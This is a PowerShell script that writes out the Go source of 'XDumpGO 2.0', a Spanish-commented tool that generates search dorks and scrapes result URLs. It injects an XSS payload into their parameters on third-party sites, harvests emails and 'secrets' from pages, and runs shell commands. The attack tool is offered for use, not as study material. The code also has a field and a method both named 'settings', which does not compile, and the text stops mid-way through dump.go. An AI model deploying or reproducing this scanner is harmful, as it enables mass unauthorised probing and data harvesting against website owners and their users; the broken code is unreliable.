# ================================================================
#  XDumpGO 2.0 - Crea el proyecto completo en tu PC local (v2 fix)
#  Guardar como: setup-xdumpgo2.ps1
#  Ejecutar:     powershell -ExecutionPolicy Bypass -File setup-xdumpgo2.ps1
# ================================================================
$ErrorActionPreference = "Stop"

# CORREGIDO: funciona tanto con -File como pegado en el prompt.
$here = (Get-Location).Path
if ($MyInvocation.MyCommand.Path) {
  $here = Split-Path -Parent $MyInvocation.MyCommand.Path
}
if (Test-Path (Join-Path $here "go.mod")) {
  $root = $here
} else {
  $root = Join-Path $here "xdumpgo2"
}
New-Item -ItemType Directory -Force -Path $root | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $root "engine") | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $root "web") | Out-Null

function Write-File([string]$path, [string]$content) {
  [System.IO.File]::WriteAllText($path, $content, (New-Object System.Text.UTF8Encoding($false)))
  Write-Host ("  + " + $path)
}

Write-Host "Creando proyecto en: $root" -ForegroundColor Cyan

Write-File (Join-Path $root "go.mod") @'
module xdumpgo2

go 1.22

require github.com/jchv/go-webview2 v0.0.0-20260205173254-56598839c808

require (
	github.com/jchv/go-winloader v0.0.0-20250406163304-c1995be93bd1 // indirect
	golang.org/x/sys v0.0.0-20210218145245-beda7e5e158e // indirect
)
'@

Write-File (Join-Path $root "go.sum") @'
github.com/jchv/go-webview2 v0.0.0-20260205173254-56598839c808 h1:ftnsTqIUH57XQEF+PnXX9++nlHCzdkuB5zbWyMMruZo=
github.com/jchv/go-webview2 v0.0.0-20260205173254-56598839c808/go.mod h1:rWifBlzkgrvd7zUqlfq91sWt3473OikgnglnIILx/Jo=
github.com/jchv/go-winloader v0.0.0-20250406163304-c1995be93bd1 h1:njuLRcjAuMKr7kI3D85AXWkw6/+v9PwtV6M6o11sWHQ=
github.com/jchv/go-winloader v0.0.0-20250406163304-c1995be93bd1/go.mod h1:alcuEEnZsY1WQsagKhZDsoPCRoOijYqhZvPwLG0kzVs=
golang.org/x/sys v0.0.0-20200810151505-1b9f1253b3ed/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20210218145245-beda7e5e158e h1:f5mksnk+hgXHnImpZoWj64ja99j9zV7YUgrVG95uFE4=
golang.org/x/sys v0.0.0-20210218145245-beda7e5e158e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
'@

Write-File (Join-Path $root "main.go") @'
package main

import (
	"context"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"time"

	"xdumpgo2/engine"

	webview "github.com/jchv/go-webview2"
)

//go:embed all:web
var webFS embed.FS

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	eng := engine.New()

	sub, err := fs.Sub(webFS, "web")
	if err != nil {
		log.Fatalf("cargando UI embebida: %v", err)
	}

	mux := http.NewServeMux()
	mux.Handle("/", http.FileServerFS(sub))

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Fatalf("escuchando en localhost: %v", err)
	}

	srv := &http.Server{Handler: mux}
	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			log.Printf("servidor HTTP: %v", err)
		}
	}()

	w := webview.New(false)
	w.SetTitle("XDumpGO 2.0 | Created by Quartz Inc.")
	w.SetSize(1366, 860, webview.HintNone)

	w.Bind("genDorks",     func(cfg string) string           { return eng.GenDorks(cfg) })
	w.Bind("startParse",   func(cfg string) string           { return eng.StartParse(cfg) })
	w.Bind("startInject",  func(cfg string) string           { return eng.StartInject(cfg) })
	w.Bind("startDump",    func(id, cfg string) string       { return eng.StartDump(id, cfg) })
	w.Bind("startDumpAll", func(cfg string) string           { return eng.StartDumpAll(cfg) })
	w.Bind("startShell",   func(cfg string) string           { return eng.StartShell(cfg) })
	w.Bind("stopAll",      func() string                     { return eng.StopAll() })
	w.Bind("getStats",     func() string                     { return eng.StatsJSON() })
	w.Bind("getResults",   func(kind string) string          { return eng.ResultsJSON(kind) })
	w.Bind("sendMsg",      func(msg string) string           { return eng.SendMsg(msg) })
	w.Bind("openFile",     func(p string) string             { return eng.OpenFile(p) })
	w.Bind("exportFile",   func(name, content string) string { return eng.ExportFile(name, content) })
	w.Bind("saveSettings", func(s string) string             { return eng.SaveSettings(s) })
	w.Bind("getSettings",  func() string                     { return eng.SettingsJSON() })

	w.Navigate(fmt.Sprintf("http://127.0.0.1:%d/", ln.Addr().(*net.TCPAddr).Port))
	w.Run()

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	_ = srv.Shutdown(ctx)
}
'@

Write-File (Join-Path (Join-Path $root "engine") "engine.go") @'
// Package engine es el motor de XDumpGO 2.0:
// genera dorks, parsea resultados de búsqueda, inyecta payloads,
// voltea (dump) páginas y ejecuta comandos de shell.
package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------- Tipos ----------

// Settings: ajustes persistentes de la app.
type Settings struct {
	Engine     string   `json:"engine"`     // "google" | "bing"
	Proxy      string   `json:"proxy"`      // http://user:pass@host:port
	Workers    int      `json:"workers"`    // workers por defecto
	TimeoutSec int      `json:"timeoutSec"` // timeout por petición (segundos)
	PerDork    int      `json:"perDork"`    // resultados por dork
	UserAgent  string   `json:"userAgent"`
	Payloads   []string `json:"payloads"`
	OutDir     string   `json:"outDir"` // directorio de exportaciones
}

// JobStat: progreso del job activo.
type JobStat struct {
	Name   string  `json:"name"`
	Done   int64   `json:"done"`
	Total  int     `json:"total"`
	Speed  float64 `json:"speed"` // items/segundo
	Active bool    `json:"active"`
}

// Stats: estado global que consulta la UI.
type Stats struct {
	Running    bool    `json:"running"`
	Job        JobStat `json:"job"`
	ElapsedSec float64 `json:"elapsedSec"`
	Dorks      int     `json:"dorks"`
	URLs       int     `json:"urls"`
	Injects    int     `json:"injects"`
	Reflected  int64   `json:"reflected"`
	Dumps      int     `json:"dumps"`
	Shell      int     `json:"shell"`
}

// LogEntry: línea del log interno.
type LogEntry struct {
	TS   string `json:"ts"`
	Kind string `json:"kind"` // info|ok|warn|err
	Msg  string `json:"msg"`
}

// Dork: dork generada.
type Dork struct {
	ID      int    `json:"id"`
	Text    string `json:"text"`
	Keyword string `json:"keyword"`
	Domain  string `json:"domain"`
}

// URLItem: URL candidata encontrada.
type URLItem struct {
	ID     int      `json:"id"`
	Raw    string   `json:"raw"`
	Host   string   `json:"host"`
	Path   string   `json:"path"`
	Params []string `json:"params"`
	Source string   `json:"source"` // dork que la produjo
	Status int      `json:"status"`
	OK     bool     `json:"ok"`
}

// Injection: resultado de inyectar un payload en un parámetro.
type Injection struct {
	ID        int    `json:"id"`
	URL       string `json:"url"`
	Param     string `json:"param"`
	Payload   string `json:"payload"`
	Status    int    `json:"status"`
	Reflected bool   `json:"reflected"`
	Snippet   string `json:"snippet"` // contexto alrededor del reflejo
}

// Dump: contenido extraído de una página.
type Dump struct {
	ID         int      `json:"id"`
	URL        string   `json:"url"`
	Title      string   `json:"title"`
	Status     int      `json:"status"`
	Size       int      `json:"size"`
	DurationMs int64    `json:"durationMs"`
	Emails     []string `json:"emails"`
	Links      []string `json:"links"`
	Forms      []string `json:"forms"`
	JSFiles    []string `json:"jsFiles"`
	Secrets    []string `json:"secrets"`
	Comments   []string `json:"comments"`
}

// ShellOut: salida de un comando.
type ShellOut struct {
	Cmd  string `json:"cmd"`
	Out  string `json:"out"`
	Err  string `json:"err"`
	Exit int    `json:"exit"`
}

// Resp: respuesta genérica de las acciones.
type Resp struct {
	OK    bool   `json:"ok"`
	Error string `json:"error,omitempty"`
	Count int    `json:"count,omitempty"`
	Path  string `json:"path,omitempty"`
}

// ---------- Motor ----------

// Engine concentra estado, workers y cliente HTTP.
type Engine struct {
	mu        sync.Mutex
	settings  Settings
	dorks     []Dork
	urls      []URLItem
	urlSeen   map[string]bool
	injects   []Injection
	dumps     []Dump
	shellOut  []ShellOut
	logs      []LogEntry
	jobName   string
	jobTotal  int
	done      int64
	reflected int64
	start     time.Time
	client    *http.Client
	bufPool   *sync.Pool
	ctx       context.Context
	cancel    context.CancelFunc
}

// DefaultPayloads: el marcador "xqz123" detecta reflejos sin falsos positivos.
var DefaultPayloads = []string{
	`xqz123"><svg/onload=alert(document.domain)>`,
}

const maxBodyBytes = 4 * 1024 * 1024 // tope de 4 MB por respuesta

// New crea el motor (carga ajustes de disco si existen).
func New() *Engine {
	ctx, cancel := context.WithCancel(context.Background())
	e := &Engine{
		ctx:     ctx,
		cancel:  cancel,
		urlSeen: make(map[string]bool),
		logs:    make([]LogEntry, 0, 512),
		bufPool: &sync.Pool{New: func() any { return make([]byte, 32 * 1024) }},
	}
	e.settings = e.loadSettings()
	e.client = newClient(e.settings)
	e.start = time.Now()
	e.log("ok", "Motor XDumpGO 2.0 inicializado")
	return e
}

// ---------- Helpers ----------

func marshal(v any) string {
	b, err := json.Marshal(v)
	if err != nil {
		return `{"ok":false,"error":"` + strings.ReplaceAll(err.Error(), `"`, "'") + `"}`
	}
	return string(b)
}

func (e *Engine) settings() Settings {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.settings.withDefaults()
}

func (e *Engine) log(kind, msg string) {
	e.mu.Lock()
	e.logs = append(e.logs, LogEntry{
		TS:   time.Now().Format("15:04:05"),
		Kind: kind,
		Msg:  msg,
	})
	if len(e.logs) > 1000 {
		e.logs = e.logs[len(e.logs)-1000:]
	}
	e.mu.Unlock()
}

// startJob prepara un job nuevo (cancela el anterior si sigue vivo).
func (e *Engine) startJob(name string, total int) context.Context {
	e.mu.Lock()
	if e.ctx.Err() == nil {
		e.cancel()
	}
	e.ctx, e.cancel = context.WithCancel(context.Background())
	e.jobName = name
	e.jobTotal = total
	atomic.StoreInt64(&e.done, 0)
	e.start = time.Now()
	ctx := e.ctx
	e.mu.Unlock()
	e.log("info", fmt.Sprintf("Job %q iniciado (%d elementos)", name, total))
	return ctx
}

func (e *Engine) endJob(name string) {
	e.mu.Lock()
	if e.ctx.Err() == nil {
		e.cancel()
	}
	e.mu.Unlock()
	e.log("ok", fmt.Sprintf("Job %q finalizado", name))
}

// parallel ejecuta fn(0..total-1) con `workers` goroutines.
func (e *Engine) parallel(ctx context.Context, workers, total int, fn func(ctx context.Context, i int)) {
	if workers < 1 {
		workers = 1
	}
	sem := make(chan struct{}, workers)
	var wg sync.WaitGroup
	for i := 0; i < total; i++ {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(i int) {
			defer wg.Done()
			defer func() { <-sem }()
			fn(ctx, i)
		}(i)
	}
	wg.Wait()
}

// markURL actualiza el último estado HTTP de una URL.
func (e *Engine) markURL(id, status int) {
	e.mu.Lock()
	for i := range e.urls {
		if e.urls[i].ID == id {
			e.urls[i].Status = status
			e.urls[i].OK = status >= 200 && status < 400
			break
		}
	}
	e.mu.Unlock()
}

// ---------- HTTP ----------

// newClient construye un cliente con pool de conexiones reutilizables.
func newClient(st Settings) *http.Client {
	var proxy func(*http.Request) (*url.URL, error)
	if p := strings.TrimSpace(st.Proxy); p != "" {
		if u, err := url.Parse(p); err == nil {
			proxy = http.ProxyURL(u)
		}
	}
	tr := &http.Transport{
		Proxy:                proxy,
		MaxIdleConns:         200,
		MaxIdleConnsPerHost:  100,
		IdleConnTimeout:      30 * time.Second,
		TLSHandshakeTimeout:  10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:    true,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   time.Duration(st.TimeoutSec) * time.Second,
	}
}

// fetch hace GET y devuelve (status, cuerpo). El cuerpo se limita a maxBodyBytes.
func (e *Engine) fetch(ctx context.Context, rawURL, ua string) (int, string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,es;q=0.8")
	resp, err := e.client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	buf := e.bufPool.Get().([]byte)
	defer e.bufPool.Put(buf)

	var sb strings.Builder
	sb.Grow(64 * 1024)
	for {
		n, rerr := resp.Body.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if rerr != nil {
			break
		}
		if sb.Len() > maxBodyBytes {
			break
		}
	}
	return resp.StatusCode, sb.String(), nil
}

// ---------- Ajustes ----------

// withDefaults rellena valores vacíos.
func (s Settings) withDefaults() Settings {
	if s.Engine == "" {
		s.Engine = "google"
	}
	if s.Workers <= 0 {
		s.Workers = 8
	}
	if s.TimeoutSec <= 0 {
		s.TimeoutSec = 12
	}
	if s.PerDork <= 0 {
		s.PerDork = 10
	}
	if s.UserAgent == "" {
		s.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
	}
	if len(s.Payloads) == 0 {
		s.Payloads = DefaultPayloads
	}
	return s
}

func settingsPath() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Join(filepath.Dir(exe), "xdumpgo2.settings.json")
	}
	return "xdumpgo2.settings.json"
}

func (e *Engine) loadSettings() Settings {
	b, err := os.ReadFile(settingsPath())
	if err != nil {
		return Settings{}.withDefaults()
	}
	var st Settings
	if json.Unmarshal(b, &st) != nil {
		return Settings{}.withDefaults()
	}
	return st.withDefaults()
}

// SettingsJSON devuelve los ajustes actuales (para la UI).
func (e *Engine) SettingsJSON() string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return marshal(e.settings.withDefaults())
}

// SaveSettings guarda los ajustes en memoria y en disco.
func (e *Engine) SaveSettings(s string) string {
	var st Settings
	if err := json.Unmarshal([]byte(s), &st); err != nil {
		return marshal(Resp{OK: false, Error: "JSON inválido: " + err.Error()})
	}
	st = st.withDefaults()
	e.mu.Lock()
	e.settings = st
	e.client = newClient(st) // aplica proxy/timeout nuevos
	e.mu.Unlock()
	if err := os.WriteFile(settingsPath(), []byte(marshal(st)), 0o644); err != nil {
		e.log("warn", "Ajustes en memoria pero no en disco: " + err.Error())
	} else {
		e.log("ok", "Ajustes guardados en " + settingsPath())
	}
	return marshal(Resp{OK: true})
}

// ---------- Estado / resultados ----------

// StatsJSON devuelve el estado global.
func (e *Engine) StatsJSON() string {
	e.mu.Lock()
	defer e.mu.Unlock()
	st := Stats{
		Dorks:     len(e.dorks),
		URLs:      len(e.urls),
		Injects:   len(e.injects),
		Reflected: atomic.LoadInt64(&e.reflected),
		Dumps:     len(e.dumps),
		Shell:     len(e.shellOut),
	}
	running := e.ctx.Err() == nil
	st.Running = running
	st.Job.Active = running
	st.Job.Name = e.jobName
	st.Job.Done = atomic.LoadInt64(&e.done)
	st.Job.Total = e.jobTotal
	if running && !e.start.IsZero() {
		el := time.Since(e.start).Seconds()
		st.ElapsedSec = el
		if el > 0.05 {
			st.Job.Speed = float64(st.Job.Done) / el
		}
	}
	return marshal(st)
}

// ResultsJSON devuelve los resultados por tipo: dorks|urls|injects|dumps|shell|logs.
func (e *Engine) ResultsJSON(kind string) string {
	e.mu.Lock()
	defer e.mu.Unlock()
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "dorks":
		return marshal(e.dorks)
	case "urls":
		return marshal(e.urls)
	case "injects":
		return marshal(e.injects)
	case "dumps":
		return marshal(e.dumps)
	case "shell":
		return marshal(e.shellOut)
	case "logs":
		return marshal(e.logs)
	default:
		return marshal(Resp{OK: false, Error: "tipo desconocido: " + kind})
	}
}

// SendMsg registra un mensaje del UI.
func (e *Engine) SendMsg(msg string) string {
	e.log("info", strings.TrimSpace(msg))
	return marshal(Resp{OK: true})
}

// StopAll cancela el job en curso.
func (e *Engine) StopAll() string {
	e.mu.Lock()
	running := e.ctx.Err() == nil
	if running {
		e.cancel()
	}
	e.mu.Unlock()
	if running {
		e.log("warn", "StopAll: job cancelado")
	}
	return marshal(Resp{OK: true})
}

// OpenFile abre una ruta con la app predeterminada del SO.
func (e *Engine) OpenFile(p string) string {
	p = strings.TrimSpace(p)
	if p == "" {
		return marshal(Resp{OK: false, Error: "ruta vacía"})
	}
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", p)
	case "darwin":
		cmd = exec.Command("open", p)
	default:
		cmd = exec.Command("xdg-open", p)
	}
	if err := cmd.Start(); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	go cmd.Wait()
	return marshal(Resp{OK: true})
}

// ExportFile escribe `content` en OutDir/name y devuelve la ruta (descarga local).
func (e *Engine) ExportFile(name, content string) string {
	st := e.settings()
	outDir := st.OutDir
	if outDir == "" {
		outDir = filepath.Join(filepath.Dir(settingsPath()), "exports")
	}
	name = filepath.Base(strings.TrimSpace(name))
	if name == "" || name == "." {
		name = time.Now().Format("export-20060102-150405.txt")
	}
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	p := filepath.Join(outDir, name)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	e.log("ok", "Exportado: " + p)
	return marshal(Resp{OK: true, Path: p})
}

// StartShell ejecuta un comando (async) y guarda la salida.
func (e *Engine) StartShell(cfg string) string {
	var c struct {
		Cmd  string   `json:"cmd"`
		Args []string `json:"args"`
		CWD  string   `json:"cwd"`
	}
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	if strings.TrimSpace(c.Cmd) == "" {
		return marshal(Resp{OK: false, Error: "comando vacío"})
	}
	st := e.settings()
	ctx := e.startJob("shell", 1)
	go func() {
		defer e.endJob("shell")
		cctx, cancel := context.WithTimeout(ctx, time.Duration(st.TimeoutSec)*time.Second)
		defer cancel()
		cmd := exec.CommandContext(cctx, c.Cmd, c.Args...)
		if c.CWD != "" {
			cmd.Dir = c.CWD
		}
		var outB, errB strings.Builder
		cmd.Stdout = &outB
		cmd.Stderr = &errB
		err := cmd.Run()
		exit := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				exit = ee.ExitCode()
			} else {
				exit = -1
			}
		}
		full := c.Cmd
		if len(c.Args) > 0 {
			full += " " + strings.Join(c.Args, " ")
		}
		e.mu.Lock()
		e.shellOut = append(e.shellOut, ShellOut{Cmd: full, Out: outB.String(), Err: errB.String(), Exit: exit})
		if len(e.shellOut) > 50 {
			e.shellOut = e.shellOut[len(e.shellOut)-50:]
		}
		e.mu.Unlock()
		atomic.AddInt64(&e.done, 1)
		e.log("ok", "Shell: "+full+" (exit "+strconv.Itoa(exit)+")")
	}()
	return marshal(Resp{OK: true})
}
'@

Write-File (Join-Path (Join-Path $root "engine") "dorks.go") @'
package engine

import (
	"encoding/json"
	"fmt"
	"strings"
)

// DorkCfg configura la generación de dorks.
type DorkCfg struct {
	Keywords []string `json:"keywords"`
	Domains  []string `json:"domains"`
	Params   []string `json:"params"`
	Max      int      `json:"max"`
	Modes    []string `json:"modes"` // "site", "inurl"
}

// GenDorks genera combinaciones de dorks (sin duplicados) y las guarda en el motor.
func (e *Engine) GenDorks(cfg string) string {
	var c DorkCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: "JSON inválido: " + err.Error()})
	}
	if c.Max <= 0 {
		c.Max = 500
	}
	if len(c.Modes) == 0 {
		c.Modes = []string{"site"}
	}

	seen := make(map[string]bool)
	var out []Dork
	add := func(text, kw, dom string) {
		text = strings.TrimSpace(text)
		if text == "" || seen[text] {
			return
		}
		seen[text] = true
		out = append(out, Dork{ID: len(out), Text: text, Keyword: kw, Domain: dom})
	}

	// Sin dominios: cada keyword es una dork global.
	if len(c.Domains) == 0 {
		for _, kw := range c.Keywords {
			kw = strings.TrimSpace(kw)
			if kw == "" {
				continue
			}
			add(kw, kw, "")
			if len(out) >= c.Max {
				break
			}
		}
	} else {
		for _, rawDom := range c.Domains {
			dom := strings.TrimSpace(rawDom)
			dom = strings.TrimPrefix(strings.TrimPrefix(dom, "https://"), "http://")
			dom = strings.Trim(dom, "/")
			if dom == "" {
				continue
			}
			for _, kw := range c.Keywords {
				kw = strings.TrimSpace(kw)
				if kw == "" {
					continue
				}
				for _, mode := range c.Modes {
					switch mode {
					case "site":
						add(fmt.Sprintf("site:%s %s", dom, kw), kw, dom)
						if len(out) >= c.Max {
							goto done
						}
					case "inurl":
						for _, p := range c.Params {
							p = strings.TrimSpace(p)
							if p == "" {
								continue
							}
							add(fmt.Sprintf("site:%s inurl:%s %s", dom, p, kw), kw, dom)
							if len(out) >= c.Max {
								goto done
							}
						}
					}
				}
			}
		}
	}
done:
	if len(out) == 0 {
		return marshal(Resp{OK: false, Error: "sin dorks: revisa keywords/domains"})
	}
	e.mu.Lock()
	e.dorks = out
	e.mu.Unlock()
	e.log("ok", fmt.Sprintf("%d dorks generadas", len(out)))
	return marshal(Resp{OK: true, Count: len(out)})
}
'@

Write-File (Join-Path (Join-Path $root "engine") "parse.go") @'
package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"html"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
)

// ParseCfg configura el parseo de resultados de búsqueda.
type ParseCfg struct {
	Dorks   []string `json:"dorks"`   // vacío => usar dorks generadas
	Engine  string   `json:"engine"`  // google|bing
	Workers int      `json:"workers"`
	PerDork int      `json:"perDork"`
}

var (
	reGoogleURL  = regexp.MustCompile(`href="(/url\?q=([^&"<>]+))"`)
	reGoogleAbs  = regexp.MustCompile(`href="(https?://[^"]+)"`)
	reBingResult = regexp.MustCompile(`(?s)<h2[^>]*>\s*<a[^>]+href="([^"]+)"`)
)

// noiseHosts: dominios que casi siempre son ruido.
var noiseHosts = map[string]bool{
	"google.com": true, "googleapis.com": true, "gstatic.com": true,
	"ggpht.com": true, "googleusercontent.com": true, "youtube.com": true,
	"bing.com": true, "microsoft.com": true, "msn.com": true,
	"w3.org": true, "schema.org": true, "ytimg.com": true,
}

// StartParse lanza el job de parseo (async).
func (e *Engine) StartParse(cfg string) string {
	var c ParseCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	st := e.settings()
	if c.Engine == "" {
		c.Engine = st.Engine
	}
	if c.Workers <= 0 {
		c.Workers = st.Workers
	}
	if c.PerDork <= 0 {
		c.PerDork = st.PerDork
	}

	var dorks []string
	if len(c.Dorks) > 0 {
		for _, d := range c.Dorks {
			if d = strings.TrimSpace(d); d != "" {
				dorks = append(dorks, d)
			}
		}
	} else {
		e.mu.Lock()
		for _, d := range e.dorks {
			dorks = append(dorks, d.Text)
		}
		e.mu.Unlock()
	}
	if len(dorks) == 0 {
		return marshal(Resp{OK: false, Error: "sin dorks: géneralas primero o pásalas en cfg.dorks"})
	}

	ctx := e.startJob("parse", len(dorks))
	go func() {
		defer e.endJob("parse")
		e.parallel(ctx, c.Workers, len(dorks), func(ctx context.Context, i int) {
			e.parseDork(ctx, dorks[i], c.Engine, c.PerDork, st.UserAgent)
			atomic.AddInt64(&e.done, 1)
		})
	}()
	return marshal(Resp{OK: true, Count: len(dorks)})
}

func (e *Engine) parseDork(ctx context.Context, dork, eng string, perDork int, ua string) {
	q := url.Values{}
	q.Set("q", dork)
	var base string
	switch eng {
	case "bing":
		base = "https://www.bing.com/search"
		q.Set("count", strconv.Itoa(perDork))
	default:
		base = "https://www.google.com/search"
		q.Set("num", strconv.Itoa(perDork))
	}
	status, body, err := e.fetch(ctx, base+"?"+q.Encode(), ua)
	if err != nil {
		e.log("warn", "parse: "+err.Error())
		return
	}
	if status != 200 {
		e.log("warn", fmt.Sprintf("parse: HTTP %d en dork %q", status, dork))
		return
	}
	n := 0
	for _, raw := range extractLinks(body, eng) {
		if ctx.Err() != nil {
			return
		}
		if e.addURL(raw, dork) {
			n++
		}
	}
	if n > 0 {
		e.log("info", fmt.Sprintf("parse: %d URLs nuevas de %q", n, dork))
	}
}

// addURL normaliza una URL, descarta ruido y la guarda si es nueva (dedup host+path).
func (e *Engine) addURL(raw, source string) bool {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Host == "" {
		return false
	}
	host := strings.ToLower(u.Hostname())
	if noiseHosts[host] {
		return false
	}
	key := host + u.Path
	e.mu.Lock()
	if e.urlSeen[key] {
		e.mu.Unlock()
		return false
	}
	e.urlSeen[key] = true
	item := URLItem{
		ID:     len(e.urls),
		Raw:    u.String(),
		Host:   host,
		Path:   u.Path,
		Params: paramNames(u),
		Source: source,
	}
	e.urls = append(e.urls, item)
	e.mu.Unlock()
	return true
}

func paramNames(u *url.URL) []string {
	seen := make(map[string]bool)
	var out []string
	for k := range u.Query() {
		if seen[k] {
			continue
		}
		seen[k] = true
		out = append(out, k)
	}
	return out
}

// extractLinks saca URLs de la HTML de resultados de google/bing.
func extractLinks(body, eng string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(s string) {
		s = html.UnescapeString(strings.TrimSpace(s))
		if s == "" || seen[s] {
			return
		}
		seen[s] = true
		out = append(out, s)
	}
	if eng == "bing" {
		for _, m := range reBingResult.FindAllStringSubmatch(body, -1) {
			add(m[1])
		}
		return out
	}
	// Google: primero los enlaces /url?q=...
	for _, m := range reGoogleURL.FindAllStringSubmatch(body, -1) {
		if u, err := url.QueryUnescape(m[2]); err == nil {
			add(u)
		}
	}
	// Fallback: enlaces absolutos que no sean de Google.
	if len(out) == 0 {
		for _, m := range reGoogleAbs.FindAllStringSubmatch(body, -1) {
			low := strings.ToLower(m[1])
			if strings.Contains(low, "google.") || strings.Contains(low, "gstatic") ||
				strings.Contains(low, "youtube.com") {
				continue
			}
			add(m[1])
		}
	}
	return out
}
'@

Write-File (Join-Path (Join-Path $root "engine") "inject.go") @'
package engine

import (
	"context"
	"encoding/json"
	"net/url"
	"strings"
	"sync/atomic"
)

// InjectCfg configura la inyección de payloads.
type InjectCfg struct {
	Workers   int      `json:"workers"`
	Payloads  []string `json:"payloads"`
	MaxURLs   int      `json:"maxUrls"`
	MaxParams int      `json:"maxParams"`
}

const marker = "xqz123" // marcador único: sin falsos positivos

// StartInject inyecta payloads en los parámetros de las URLs (async).
func (e *Engine) StartInject(cfg string) string {
	var c InjectCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	st := e.settings()
	if c.Workers <= 0 {
		c.Workers = st.Workers
	}
	if len(c.Payloads) == 0 {
		c.Payloads = st.Payloads
	}
	if c.MaxURLs <= 0 {
		c.MaxURLs = 200
	}
	if c.MaxParams <= 0 {
		c.MaxParams = 3
	}

	e.mu.Lock()
	e.injects = nil // corrida limpia
	targets := make([]URLItem, 0, c.MaxURLs)
	for _, u := range e.urls {
		if len(u.Params) == 0 {
			continue
		}
		targets = append(targets, u)
		if len(targets) >= c.MaxURLs {
			break
		}
	}
	e.mu.Unlock()
	if len(targets) == 0 {
		return marshal(Resp{OK: false, Error: "sin URLs con parámetros: ejecuta Parse primero"})
	}

	ctx := e.startJob("inject", len(targets))
	go func() {
		defer e.endJob("inject")
		e.parallel(ctx, c.Workers, len(targets), func(ctx context.Context, i int) {
			e.injectURL(ctx, targets[i], c.Payloads, c.MaxParams, st.UserAgent)
			atomic.AddInt64(&e.done, 1)
		})
	}()
	return marshal(Resp{OK: true, Count: len(targets)})
}

func (e *Engine) injectURL(ctx context.Context, u URLItem, payloads []string, maxParams int, ua string) {
	ru, err := url.Parse(u.Raw)
	if err != nil {
		return
	}
	paras := u.Params
	if len(paras) > maxParams {
		paras = paras[:maxParams]
	}
	marked := false
	for _, p := range paras {
		if ctx.Err() != nil {
			return
		}
		for _, pl := range payloads {
			q := ru.Query()
			q.Set(p, pl)
			probe := *ru
			probe.RawQuery = q.Encode()

			inj := Injection{URL: probe.String(), Param: p, Payload: pl}
			if status, body, err := e.fetch(ctx, probe.String(), ua); err == nil {
				inj.Status = status
				if !marked {
					e.markURL(u.ID, status)
					marked = true
				}
				if strings.Contains(body, marker) {
					inj.Reflected = true
					inj.Snippet = snippetAround(body, marker)
					atomic.AddInt64(&e.reflected, 1)
				}
			}
			e.mu.Lock()
			inj.ID = len(e.injects)
			e.injects = append(e.injects, inj)
			e.mu.Unlock()
			if inj.Reflected {
				break // parámetro reflejante: no probar más payloads
			}
		}
	}
}

func snippetAround(s, needle string) string {
	i := strings.Index(s, needle)
	if i < 0 {
		return ""
	}
	a := i - 70
	if a < 0 {
		a = 0
	}
	b := i + 70
	if b > len(s) {
		b = len(s)
	}
	return s[a:b]
}
'@

Write-File (Join-Path (Join-Path $root "engine") "dump.go") @'
package engine

import (
	"context"
	"encoding/json"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// DumpCfg configura el volteo de páginas.
type DumpCfg struct {
	Workers int  `json:"workers"`
	MaxURLs int  `json:"maxUrls"`
	OnlyOK  bool `json:"onlyOk"`
}

var (
	reTitle   = regexp.MustCompile(`(?is)<title[^>]*>(.*?)</title>`)
	reEmail   = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
	reLink    = regexp.MustCompile(`(?is)<a[^>]+href="([^"]+)"`)
